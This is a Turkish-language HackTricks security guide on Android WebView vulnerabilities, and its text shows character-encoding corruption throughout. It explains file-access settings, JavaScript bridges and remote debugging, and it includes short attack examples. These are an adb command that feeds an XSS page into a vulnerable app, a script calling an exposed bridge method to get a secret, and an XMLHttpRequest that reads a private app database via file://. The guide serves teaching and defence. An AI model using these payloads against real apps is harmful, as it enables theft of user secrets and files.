# WebView SaldÄ±rÄ±larÄ±

<details>

<summary><strong>AWS hacklemeyi sÄ±fÄ±rdan kahraman olmak iÃ§in</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS KÄ±rmÄ±zÄ± TakÄ±m UzmanÄ±)</strong></a><strong>Ã¶ÄŸrenin!</strong></summary>

HackTricks'i desteklemenin diÄŸer yollarÄ±:

* Åirketinizi HackTricks'te **reklamÄ±nÄ±zÄ± gÃ¶rmek** veya **HackTricks'i PDF olarak indirmek** iÃ§in [**ABONELÄ°K PLANLARI**](https://github.com/sponsors/carlospolop)'na gÃ¶z atÄ±n!
* [**Resmi PEASS & HackTricks Ã¼rÃ¼nlerini**](https://peass.creator-spring.com) edinin
* [**PEASS Ailesi'ni**](https://opensea.io/collection/the-peass-family) keÅŸfedin, Ã¶zel [**NFT'lerimiz**](https://opensea.io/collection/the-peass-family) koleksiyonumuz
* ğŸ’¬ [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) **katÄ±lÄ±n** veya **Twitter** ğŸ¦ [**@carlospolopm**](https://twitter.com/hacktricks_live)'u **takip edin**.
* Hacking hilelerinizi gÃ¶ndererek HackTricks ve HackTricks Cloud github depolarÄ±na PR gÃ¶ndererek **hacking hilelerinizi paylaÅŸÄ±n**.

</details>

## WebView YapÄ±landÄ±rmalarÄ± ve GÃ¼venlik HakkÄ±nda BasitleÅŸtirilmiÅŸ KÄ±lavuz

### WebView Zafiyetlerinin Genel BakÄ±ÅŸÄ±

Android geliÅŸtirmenin kritik bir yÃ¶nÃ¼, WebViews'Ä±n doÄŸru bir ÅŸekilde iÅŸlenmesini iÃ§erir. Bu kÄ±lavuz, WebView kullanÄ±mÄ±yla iliÅŸkili riskleri azaltmak iÃ§in Ã¶nemli yapÄ±landÄ±rmalarÄ± ve gÃ¼venlik uygulamalarÄ±nÄ± vurgular.

![WebView Ã–rneÄŸi](../../.gitbook/assets/image%20(718).png)

### **WebViews'da Dosya EriÅŸimi**

VarsayÄ±lan olarak, WebViews dosya eriÅŸimine izin verir. Bu iÅŸlevsellik, Android API seviyesi 3'ten (Cupcake 1.5) beri mevcut olan `setAllowFileAccess()` yÃ¶ntemi tarafÄ±ndan kontrol edilir. **android.permission.READ_EXTERNAL_STORAGE** iznine sahip uygulamalar, bir dosya URL ÅŸemasÄ± (`file://path/to/file`) kullanarak harici depolamadan dosyalarÄ± okuyabilir.

#### **KullanÄ±mdan KaldÄ±rÄ±lan Ã–zellikler: Evrensel ve URL'lerden Dosya EriÅŸimi**

- **URL'lerden Evrensel EriÅŸim**: Bu kullanÄ±mdan kaldÄ±rÄ±lan Ã¶zellik, dosya URL'lerinden kÃ¶kenler arasÄ± isteklere izin veriyordu ve potansiyel XSS saldÄ±rÄ±larÄ± nedeniyle Ã¶nemli bir gÃ¼venlik riski oluÅŸturuyordu. Android Jelly Bean ve daha yeni sÃ¼rÃ¼mlere hedeflenen uygulamalar iÃ§in varsayÄ±lan ayar devre dÄ±ÅŸÄ± bÄ±rakÄ±lmÄ±ÅŸtÄ±r (`false`).
- Bu ayarÄ± kontrol etmek iÃ§in `getAllowUniversalAccessFromFileURLs()` kullanÄ±n.
- Bu ayarÄ± deÄŸiÅŸtirmek iÃ§in `setAllowUniversalAccessFromFileURLs(boolean)` kullanÄ±n.

- **URL'lerden Dosya EriÅŸimi**: Bu Ã¶zellik de kullanÄ±mdan kaldÄ±rÄ±lmÄ±ÅŸ olup, diÄŸer dosya ÅŸema URL'lerinden iÃ§eriÄŸe eriÅŸimi kontrol eder. Evrensel eriÅŸim gibi, varsayÄ±lan ayarÄ± artÄ±rÄ±lmÄ±ÅŸ gÃ¼venlik iÃ§in devre dÄ±ÅŸÄ±dÄ±r.
- Kontrol etmek iÃ§in `getAllowFileAccessFromFileURLs()` kullanÄ±n ve `setAllowFileAccessFromFileURLs(boolean)` kullanarak ayarlayÄ±n.

#### **GÃ¼venli Dosya YÃ¼kleme**

VarlÄ±klara ve kaynaklara eriÅŸirken dosya sistemine eriÅŸimi devre dÄ±ÅŸÄ± bÄ±rakmak iÃ§in `setAllowFileAccess()` yÃ¶ntemi kullanÄ±lÄ±r. Android R ve Ã¼stÃ¼ sÃ¼rÃ¼mlerde varsayÄ±lan ayar `false` olarak ayarlanmÄ±ÅŸtÄ±r.
- `getAllowFileAccess()` ile kontrol edin.
- `setAllowFileAccess(boolean)` ile etkinleÅŸtirin veya devre dÄ±ÅŸÄ± bÄ±rakÄ±n.

#### **WebViewAssetLoader**

**WebViewAssetLoader** sÄ±nÄ±fÄ±, yerel dosyalarÄ± yÃ¼klemek iÃ§in modern bir yaklaÅŸÄ±mdÄ±r. AynÄ± KÃ¶ken politikasÄ±yla uyumlu olmasÄ± iÃ§in http(s) URL'lerini kullanÄ±r ve bu ÅŸekilde CORS yÃ¶netimini kolaylaÅŸtÄ±rÄ±r.

### **JavaScript ve Intent Åema Ä°ÅŸleme**

- **JavaScript**: WebViews'da varsayÄ±lan olarak devre dÄ±ÅŸÄ±dÄ±r, `setJavaScriptEnabled()` aracÄ±lÄ±ÄŸÄ±yla etkinleÅŸtirilebilir. JavaScript'i uygun gÃ¼venlik Ã¶nlemleri olmadan etkinleÅŸtirmek, gÃ¼venlik aÃ§Ä±klarÄ±na neden olabileceÄŸinden dikkatli olunmalÄ±dÄ±r.

- **Intent ÅemasÄ±**: WebViews, `intent` ÅŸemasÄ±nÄ± iÅŸleyebilir ve dikkatli yÃ¶netilmezse saldÄ±rÄ±lara yol aÃ§abilir. Bir Ã¶rnek zafiyet, kÃ¶tÃ¼ye kullanÄ±labilecek bir aÃ§Ä±k WebView parametresi olan "support_url" iÃ§eriyordu ve bu parametre Ã¼zerinden kÃ¶k site komut dosyasÄ± (XSS) saldÄ±rÄ±larÄ± gerÃ§ekleÅŸtirilebilirdi.

![Zafiyetli WebView](../../.gitbook/assets/image%20(719).png)

adb kullanarak kÃ¶tÃ¼ye kullanma Ã¶rneÄŸi:
```bash
adb.exe shell am start -n com.tmh.vulnwebview/.SupportWebView â€“es support_url "https://example.com/xss.html"
```
### Javascript KÃ¶prÃ¼sÃ¼

Android tarafÄ±ndan saÄŸlanan bir Ã¶zellik, WebView'deki **JavaScript'in** **yerel Android uygulama iÅŸlevlerini** Ã§aÄŸÄ±rmasÄ±nÄ± saÄŸlar. Bu, JavaScript'i yerel Android iÅŸlevleriyle entegre eden `addJavascriptInterface` yÃ¶ntemi kullanÄ±larak gerÃ§ekleÅŸtirilir ve _WebView JavaScript kÃ¶prÃ¼sÃ¼_ olarak adlandÄ±rÄ±lÄ±r. Bu yÃ¶ntem, kayÄ±tlÄ± JavaScript ArayÃ¼zÃ¼ nesnesine WebView iÃ§indeki tÃ¼m sayfalarÄ±n eriÅŸmesine izin verdiÄŸi iÃ§in, hassas bilgilerin bu arayÃ¼zler aracÄ±lÄ±ÄŸÄ±yla ifÅŸa edilmesi durumunda gÃ¼venlik riski oluÅŸturabilir.

### Ã–nemli DÃ¼ÅŸÃ¼nceler

- Android sÃ¼rÃ¼mÃ¼ 4.2'nin altÄ±nda hedeflenen uygulamalar iÃ§in **aÅŸÄ±rÄ± dikkat** gereklidir, Ã§Ã¼nkÃ¼ yansÄ±mayÄ± kullanarak kÃ¶tÃ¼ niyetli JavaScript aracÄ±lÄ±ÄŸÄ±yla uzaktan kod yÃ¼rÃ¼tme izni veren bir zayÄ±flÄ±k bulunmaktadÄ±r.

#### Bir JavaScript KÃ¶prÃ¼sÃ¼ Uygulama

- **JavaScript arayÃ¼zleri**, Ã¶rneklerde gÃ¶sterildiÄŸi gibi yerel kodla etkileÅŸimde bulunabilir, burada bir sÄ±nÄ±f yÃ¶ntemi JavaScript'e aÃ§Ä±klanmÄ±ÅŸtÄ±r:
```javascript
@JavascriptInterface
public String getSecret() {
return "SuperSecretPassword";
};
```
- JavaScript KÃ¶prÃ¼sÃ¼, WebView'e bir arayÃ¼z ekleyerek etkinleÅŸtirilir:
```javascript
webView.addJavascriptInterface(new JavascriptBridge(), "javascriptBridge");
webView.reload();
```
- Potansiyel olarak JavaScript aracÄ±lÄ±ÄŸÄ±yla sÃ¶mÃ¼rÃ¼lebilirlik, Ã¶rneÄŸin XSS saldÄ±rÄ±sÄ± yoluyla, aÃ§Ä±ÄŸa Ã§Ä±karÄ±lmÄ±ÅŸ Java yÃ¶ntemlerinin Ã§aÄŸrÄ±lmasÄ±na olanak saÄŸlar:
```html
<script>alert(javascriptBridge.getSecret());</script>
```
- Riskleri azaltmak iÃ§in, JavaScript kÃ¶prÃ¼sÃ¼ kullanÄ±mÄ±nÄ± APK ile birlikte gÃ¶nderilen kodla sÄ±nÄ±rlayÄ±n ve uzaktan JavaScript yÃ¼klemeyi engelleyin. Eski cihazlar iÃ§in minimum API seviyesini 17 olarak ayarlayÄ±n.

### YansÄ±ma TabanlÄ± Uzaktan Kod YÃ¼rÃ¼tme (RCE)

- Belgeleme yÃ¶ntemi, belirli bir yÃ¼k ile yansÄ±ma yoluyla RCE elde etmeyi saÄŸlar. Bununla birlikte, `@JavascriptInterface` iÅŸaretlemesi yetkisiz yÃ¶ntem eriÅŸimini engeller ve saldÄ±rÄ± yÃ¼zeyini sÄ±nÄ±rlar.

### Uzaktan Hata AyÄ±klama

- **Uzaktan hata ayÄ±klama**, **Chrome GeliÅŸtirici AraÃ§larÄ±** ile mÃ¼mkÃ¼ndÃ¼r ve WebView iÃ§eriÄŸi iÃ§inde etkileÅŸim ve keyfi JavaScript yÃ¼rÃ¼tme saÄŸlar.

#### Uzaktan Hata AyÄ±klamayÄ± EtkinleÅŸtirme

- Uzaktan hata ayÄ±klama, bir uygulama iÃ§indeki tÃ¼m WebView'ler iÃ§in etkinleÅŸtirilebilir:
```java
if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.KITKAT) {
WebView.setWebContentsDebuggingEnabled(true);
}
```
- UygulamanÄ±n hata ayÄ±klanabilir durumuna baÄŸlÄ± olarak hata ayÄ±klamayÄ± koÅŸullu olarak etkinleÅŸtirmek iÃ§in:
```java
if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.KITKAT) {
if (0 != (getApplicationInfo().flags & ApplicationInfo.FLAG_DEBUGGABLE))
{ WebView.setWebContentsDebuggingEnabled(true); }
}
```
## Keyfi DosyalarÄ± SÄ±zdÄ±rma

- Bir XMLHttpRequest kullanarak keyfi dosyalarÄ±n nasÄ±l sÄ±zdÄ±rÄ±lacaÄŸÄ±nÄ± gÃ¶sterir:
```javascript
var xhr = new XMLHttpRequest();
xhr.onreadystatechange = function() {
if (xhr.readyState == XMLHttpRequest.DONE) {
alert(xhr.responseText);
}
}
xhr.open('GET', 'file:///data/data/com.authenticationfailure.wheresmybrowser/databases/super_secret.db', true);
xhr.send(null);
```
## Referanslar
* [https://labs.integrity.pt/articles/review-android-webviews-fileaccess-attack-vectors/index.html](https://labs.integrity.pt/articles/review-android-webviews-fileaccess-attack-vectors/index.html)
* [https://github.com/authenticationfailure/WheresMyBrowser.Android](https://github.com/authenticationfailure/WheresMyBrowser.Android)
* [https://developer.android.com/reference/android/webkit/WebView](https://developer.android.com/reference/android/webkit/WebView)

<details>

<summary><strong>AWS hackleme konusunda sÄ±fÄ±rdan kahramana dÃ¶nÃ¼ÅŸmek iÃ§in</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS KÄ±rmÄ±zÄ± TakÄ±m UzmanÄ±)</strong></a><strong>'Ä± Ã¶ÄŸrenin!</strong></summary>

HackTricks'i desteklemenin diÄŸer yollarÄ±:

* Åirketinizi HackTricks'te **reklamÄ±nÄ±zÄ± gÃ¶rmek** veya HackTricks'i **PDF olarak indirmek** iÃ§in [**ABONELÄ°K PLANLARINI**](https://github.com/sponsors/carlospolop) kontrol edin!
* [**Resmi PEASS & HackTricks Ã¼rÃ¼nlerini**](https://peass.creator-spring.com) edinin
* Ã–zel [**NFT'lerden**](https://opensea.io/collection/the-peass-family) oluÅŸan koleksiyonumuz [**The PEASS Family**](https://opensea.io/collection/the-peass-family)'i keÅŸfedin
* ğŸ’¬ [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) **katÄ±lÄ±n** veya bizi **Twitter** ğŸ¦ [**@carlospolopm**](https://twitter.com/hacktricks_live)**'da takip edin.**
* **Hacking hilelerinizi** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github depolarÄ±na **PR gÃ¶ndererek** paylaÅŸÄ±n.

</details>
